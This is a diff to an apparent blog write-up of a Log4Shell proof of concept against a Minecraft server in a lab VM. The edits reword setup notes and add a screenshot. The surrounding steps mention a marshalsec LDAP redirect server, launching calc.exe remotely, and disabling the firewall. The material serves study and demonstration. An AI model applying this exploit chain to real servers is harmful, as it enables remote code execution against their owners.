@@ -58,7 +58,7 @@ My goal is simple. Exploiting the log4j vulnerability to execute `calc.exe` remo
 
 <u>Note 1</u>: It's <span style="color:#e5202a"><b>important</b></span> that you choose the <span style="color:#e5202a"><b>JDK</b></span>, not the JRE! Because JRE doesn't have javac for compiling. 
 
-<u>Note 2</u>: remember to choose the right (old) version since the minecraft server might not be able to understand exploits that are compiled in newer Java version.
+<u>Note 2</u>: remember to choose the right (old) version of JDK since the minecraft server might not be able to understand exploits that are compiled in newer Java version.
 
 What the POC does:
 - Create a LDAP server that will redirect Minecraft server to the exploit (Done by this [repo](https://github.com/mbechler/marshalsec)).
@@ -103,9 +103,10 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 
 
 ##### Step 5. Run the Minecraft server on a VM (I set it to bridged mode):
 ```
-Remember to get the IP of the VM. Mine is 172.30.146.200.
-For the sake of POC, turn off the firewall so it will allow incoming connections to the server (normally the server administrators would set up firewall specifically for minecraft port).
-Go to the eula.txt and set eula=true.
+- Remember to get the IP of the VM. 
+- Mine is 172.30.146.200.
+- For the sake of POC, turn off the firewall so it will allow incoming connections to the server (normally the server administrators would set up firewall specifically for minecraft port).
+- Go to the eula.txt and set eula=true.
 ```
 
 ```sh
@@ -120,6 +121,9 @@ Rerun the server:
 java -jar server.jar
 ```
 
+| ![Minecraft-server](https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_server_online_mode_false.PNG) |
+|:--:| 
+| *Minecraft server cmdline output.* |
 
 ##### Step 6. Start the Minecraft client:
 ``` 
